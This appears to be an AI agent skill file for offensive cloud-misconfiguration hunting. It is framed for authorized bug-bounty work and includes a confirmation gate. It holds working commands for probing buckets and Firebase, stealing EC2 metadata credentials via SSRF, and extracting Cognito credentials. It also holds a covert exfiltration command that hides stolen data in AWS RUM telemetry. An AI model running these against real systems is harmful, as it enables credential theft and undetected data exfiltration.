---
name: hunt-cloud-misconfig
description: Hunt cloud / infrastructure misconfigurations.
category: security
risk: offensive
source: https://github.com/elementalsouls/Claude-BugHunter
source_repo: elementalsouls/Claude-BugHunter
source_type: community
date_added: '2026-09-20'
license: MIT
license_source: https://github.com/elementalsouls/Claude-BugHunter/blob/main/LICENSE
compatibility: Requires explicit written authorization for a target scope plus the
  relevant testing tools for this technique. Docs-only; helper scripts and commands
  not bundled.
sources: hackerone_public, public_research
report_count: 6
---
> **⚠️ AUTHORIZED USE ONLY**
> This skill is for educational purposes or authorized security assessments only.
> You must have explicit, written permission from the system owner before using this tool.
> Misuse of this tool is illegal and strictly prohibited.

> **Mandatory confirmation gate**
> Before running any command that probes, exploits, changes, persists on, extracts data from, or attempts credential access against a target:
> 1. Ask the user to state the exact target URL, IP, account, or resource.
> 2. Ask the user to confirm written authorization and the permitted scope.
> 3. Show the exact command(s) and explain their expected effect.
> 4. Wait for explicit confirmation in the current conversation.
>
> Without that confirmation, remain read-only and provide defensive guidance only. Prefer a sandbox, disposable VM, or controlled lab.

## 16. CLOUD / INFRA MISCONFIGS

### S3 / GCS / Azure Blob
```bash
# S3 listing
curl -s "https://TARGET-NAME.s3.amazonaws.com/?max-keys=10"
aws s3 ls s3://target-bucket-name --no-sign-request

# Try common bucket names
for name in target target-backup target-assets target-prod target-staging; do
  curl -s -o /dev/null -w "$name: %{http_code}\n" "https://$name.s3.amazonaws.com/"
done

# Firebase open rules
curl -s "https://TARGET-APP.firebaseio.com/.json"   # read
curl -s -X PUT "https://TARGET-APP.firebaseio.com/test.json" -d '"pwned"'  # write
```

### EC2 Metadata (via SSRF)
```bash
http://169.254.169.254/latest/meta-data/iam/security-credentials/  # role name
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME  # keys
```

### Exposed Admin Panels
```
/jenkins  /grafana  /kibana  /elasticsearch  /swagger-ui.html
/phpMyAdmin  /.env  /config.json  /api-docs  /server-status
```

---

### Jenkins SSO-restriction failure → Script Console RCE
An exposed Jenkins that authenticates ANY personal Google/OAuth account (missing org-domain restriction) is full compromise: log in, then `/script` (Groovy console) = RCE, and `/credentials` + `/scriptText` = stored API tokens and source disclosure. Disclosed: reports/231460.

### Exposed message broker (RabbitMQ / AMQP) with default creds
Probe RabbitMQ management (`http://TARGET:15672/`, API `:15672/api/overview`) and AMQP `:5672`; try default `guest:guest` (works off-localhost when `loopback_users` is misconfigured) → queue/message read, vhost enumeration, management-plugin admin. Disclosed: reports/753602.

## Local-verification toolchain

For testing cloud-misconfig findings against a local AWS sim before/instead of hitting real cloud:

```bash
# LocalStack 3.0 community (pin the version — 4.x requires a Pro license)
docker run -d --name lab-localstack -p 14566:4566 localstack/localstack:3.0

# awscli ≥ 2.30 + LocalStack 3.0 incompatibility workaround (x-amz-trailer header):
export AWS_REQUEST_CHECKSUM_CALCULATION=when_required
export AWS_RESPONSE_CHECKSUM_VALIDATION=when_required
export AWS_ENDPOINT_URL=http://localhost:14566
export AWS_ACCESS_KEY_ID=test AWS_SECRET_ACCESS_KEY=test AWS_DEFAULT_REGION=us-east-1
```

Without those env vars, `aws s3 cp/sync` fails with `InvalidRequest`. Document this for the team. See `docs/verification/phase2j-cloud-localstack.md` for the full reproducible flow.

---

## CloudWatch RUM Weaponization (2024-2026 surface)

AWS CloudWatch RUM (Real-User Monitoring) is a client-side telemetry service launched late 2021. Customers embed a JS snippet on their pages that sends performance/error events to `dataplane.rum.<region>.amazonaws.com`. The snippet's `AppMonitor` config contains an `identityPoolId` (Cognito) and `guestRoleArn` (IAM role) — both **public by design**. The IAM role policy is the security boundary, and when developers leave it broader than the documented minimum (`rum:PutRumEvents` on the AppMonitor ARN), the entire pool becomes the unauthenticated AWS-credential vending machine described in `cloud-iam-deep` → Cognito Identity Pool chain.

### Detection — JS bundle fingerprints

**Snippet-style (most common, embedded in `<head>`):**
```javascript
(function(n,i,v,r,s,c,x,z){...})(
  'cwr',
  '00000000-0000-0000-0000-000000000000',                       // applicationId (UUID)
  '1.0.0',
  'us-east-1',
  'https://client.rum.us-east-1.amazonaws.com/1.x/cwr.js',
  {
    sessionSampleRate: 1,
    guestRoleArn: "arn:aws:iam::123456789012:role/RUM-Monitor-...-Unauth",
    identityPoolId: "us-east-1:abcd1234-...",
    endpoint: "https://dataplane.rum.us-east-1.amazonaws.com",
    telemetries: ["errors","performance","http"]
  }
);
```

**NPM-style (aws-rum-web package):**
```javascript
import { AwsRum, AwsRumConfig } from 'aws-rum-web';
const config: AwsRumConfig = { identityPoolId, endpoint, guestRoleArn, ... };
const awsRum = new AwsRum(APPLICATION_ID, '1.0.0', AWS_REGION, config);
```

### Regex set for recon

```bash
# Detect RUM init
grep -REn "cwr\(['\"]init['\"]|from\s+['\"]aws-rum-web['\"]|new\s+AwsRum\(" .

# Extract applicationId (UUID v4)
grep -ErohE "applicationId['\"]?\s*[:=]\s*['\"] ([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})['\"]" .

# Extract identityPoolId (region:UUID)
grep -ErohE "identityPoolId['\"]?\s*[:=]\s*['\"] ([a-z]{2}-[a-z]+-[0-9]+:[0-9a-f-]{36})['\"]" .

# Extract guestRoleArn (leaks AWS account ID + role name)
grep -ErohE "guestRoleArn['\"]?\s*[:=]\s*['\"]arn:aws:iam::[0-9]{12}:role/[A-Za-z0-9._/-]+['\"]" .

# Endpoint reveals region
grep -ErohE "dataplane\.rum\.[a-z0-9-]+\.amazonaws\.com" .
```

### Attack chains

**Chain A — Credential extraction (Critical when guestRole is over-permissioned).** Once `identityPoolId` is extracted from the page, anyone runs:

```bash
aws cognito-identity get-id \
  --identity-pool-id "us-east-1:abcd1234-..." \
  --region us-east-1 --no-sign-request
aws cognito-identity get-credentials-for-identity \
  --identity-id "us-east-1:<returned-uuid>" \
  --region us-east-1 --no-sign-request
# → STS creds; export and:
aws sts get-caller-identity        # confirm role
aws s3 ls; aws dynamodb list-tables; aws lambda list-functions; aws ssm describe-parameters; aws secretsmanager list-secrets
# Automate: pacu / enumerate-iam.py
```

Full chain documented in `cloud-iam-deep` → Cognito Identity Pool unauthenticated chain. RUM is one common embedding context.

**Chain B — Telemetry endpoint covert exfil.** `dataplane.rum.<region>.amazonaws.com` is an **AWS-owned domain on every enterprise allowlist**. The `PutRumEvents` payload accepts arbitrary `userDetails` and `customEvents` string fields:

```bash
aws rum put-rum-events \
  --id $(uuidgen) \
  --app-monitor-details '{"id":"<appId>","version":"1.0.0"}' \
  --user-details '{"userId":"EXFIL_PAYLOAD_HERE","sessionId":"<session>"}' \
  --rum-events '[{"id":"'$(uuidgen)'","timestamp":'$(date +%s)',"type":"com.amazon.rum.custom_event","details":"{\"exfil\":\"<base64 of stolen data>\"}"}]' \
  --endpoint-url "https://dataplane.rum.us-east-1.amazonaws.com" \
  --region us-east-1
```

Defenders watching egress see traffic to a known-good AWS hostname; DLP doesn't parse the JSON body; SIEM rules typically don't ingest customer RUM telemetry.

**Chain C — DOM injection via snippet source poisoning.** Many customers either self-host `cwr.js` on their own CDN (`assets.target.com/cwr.js`) or bundle `aws-rum-web` and serve from `static.target.com/main.<hash>.js`. Subdomain takeover on the JS host or supply-chain compromise (npm typosquat against `aws-rum-webb`) gives persistent JS execution on every page-load with the trust of the `aws-rum-web` SDK — including its already-granted Cognito permissions.

**Chain D — Telemetry injection / dashboard poisoning.** With the public `identityPoolId` + `applicationId`, an external attacker can flood `PutRumEvents` with fake error spikes (drown real alerts), inject XSS payloads into page-URL telemetry that fire when an SOC analyst views the CloudWatch dashboard, and inflate billable RUM event counts (financial DoS).

### Severity rubric

| Finding | Severity | Justification |
|---|---|---|
| `guestRoleArn` with `*:*` or wildcards on multiple services | **Critical** (9.1+) | Anonymous full AWS access |
| `guestRoleArn` with `s3:*`, `dynamodb:*`, `secretsmanager:*`, `lambda:Invoke*` on production resources | **High** (7.5-8.8) | Data exfil / RCE depending on resource |
| `guestRoleArn` with `cognito-identity:*` or `iam:PassRole` | **High** (8.0) | Privilege escalation primitive |
| `guestRoleArn` with only `rum:PutRumEvents` + endpoint-scoped resource | **Informational** | Documented, intended config |
| RUM `userDetails` logging PII into events viewable in CloudWatch console | **Medium** (5.3-6.5) | Sensitive data exposure via dashboard sharing |
| RUM AppMonitor accepts `PutRumEvents` from arbitrary internet sources (telemetry injection) | **Low-Medium** (4.3) | Dashboard poisoning, alert evasion, billing DoS |
| Self-hosted `cwr.js` on takeoverable subdomain | **Critical** (9.8) when chained | Persistent stored XSS across every customer page |

### Disclosed cases / authoritative writeups

No CVE assigned specifically to AWS RUM as of 2026-05. The attack class is documented in research but specific named bug-bounty payouts on RUM are rare in public hacktivity. The pattern is "Cognito identity pool over-permission via embedded SDK" — RUM is one common embedding.

- **Andres Riancho — "Misconfigured Cognito Identity Pools" (2020/2023)** — establishes the attack class. [andresriancho.com](https://andresriancho.com/identity-pools-and-the-default-iam-role-trap/)
- **Rhino Security Labs — Pacu `cognito__enum_identity_pools`** — production tooling that automates Chain A. [github.com/RhinoSecurityLabs/pacu](https://github.com/RhinoSecurityLabs/pacu)
- **NotSoSecure / Claranet — "Exploiting weak configurations in Amazon Cognito" (Nov 2023)** — explicitly calls out RUM as one of three SDKs commonly leaking the pool ID. [notsosecure.com](https://www.notsosecure.com/exploiting-weak-configurations-in-amazon-cognito/)
- **HackTricks Cloud — `aws-cognito-unauthenticated-enum`** — canonical playbook. [cloud.hacktricks.wiki](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-unauthenticated-enum-access/aws-cognito-unauthenticated-enum.html)
- **Datadog Security Labs — "Following AWS Logs Backwards: Cognito Identity Pool Abuse" (2024)** — telemetry showing real-world abuse rates. [securitylabs.datadoghq.com](https://securitylabs.datadoghq.com/articles/abusing-aws-cognito-misconfigurations/)
- **aws-observability/aws-rum-web GitHub issues #213, #404** — community discussion of the bundled-snippet security model. [github.com/aws-observability/aws-rum-web](https://github.com/aws-observability/aws-rum-web/issues)

### Validation checklist (before reporting)

1. Extract `identityPoolId` from page source.
2. Confirm pool allows unauth identities (`get-id` succeeds without auth).
3. Confirm `get-credentials-for-identity` returns STS creds.
4. Run `aws sts get-caller-identity` and **screenshot the role ARN**.
5. Run `enumerate-iam` / Pacu `iam__enum_permissions` — capture **at least one allowed action beyond `rum:PutRumEvents`**. Without this, the finding is Informational.
6. Demonstrate at least one read/list against a real resource (S3 bucket list, DynamoDB scan, Lambda invoke).
7. **Do not** modify/delete data even if permitted — read-only PoC only.

---

## Related Skills & Chains

- **`hunt-subdomain`** — Stale CNAMEs pointing to deleted buckets are a takeover gold mine. Chain primitive: Cloud misconfig (S3 public/deleted) + `hunt-subdomain` → unclaimed CNAME points to bucket → `assets.target.com` takeover.
- **`cloud-iam-deep`** — A leaked SA JSON / AWS key in a public bucket is only half the bug. Chain primitive: Public S3 + leaked AWS key in `.env` → `cloud-iam-deep` enumeration → cross-service `iam:PassRole` escalation.
- **`hunt-ssrf`** — Metadata service is reachable only from inside the VPC; SSRF is the bridge. Chain primitive: SSRF + cloud misconfig (IMDSv1 still enabled) → instance role keys → S3/RDS data read.
- **`supply-chain-attack-recon`** — Exposed CI/CD endpoints and SBOMs reveal internal package names. Chain primitive: Exposed Jenkins/GitLab + internal package name leak → npm/PyPI dependency-confusion publish → CI build pwn.
- **`security-arsenal`** — Load the Cloud Bucket Wordlist (target-prod / target-backup / target-staging permutations) and the Admin-Panel Path List for fast enumeration.
- **`triage-validation`** — Apply the Unique-Marker gate: any "writable bucket" claim requires a write of a unique marker file and a read-back from a clean session before report submission.

## When to Use

- You have explicit, written authorization to assess the target in scope, and the task matches this skill's vulnerability class or technique within a bug-bounty or penetration-test engagement.
- You need the recon, exploitation, or validation workflow described below — executed strictly inside the approved scope.

## Limitations

- Authorized scope only: the confirmation gate above is mandatory before any probing, exploitation, or credential-access command.
- Docs-only import: upstream helper scripts, commands, engine, and research assets are not bundled; reinstall tooling from the source repo when needed.
- Validate every finding (see `triage-validation`) before reporting; report via `report-writing`. Prefer a sandbox, disposable VM, or controlled lab.

### Example

```bash
# Read-only first step; confirm scope before anything active.
cat scope.txt  # target list from the authorized engagement brief
```

> Adapted from [elementalsouls/Claude-BugHunter](https://github.com/elementalsouls/Claude-BugHunter) (MIT); frontmatter, When to Use/Limitations, and safety boundaries added for upstream compliance. Docs-only import: executable helpers, commands, engine, and research assets not bundled.
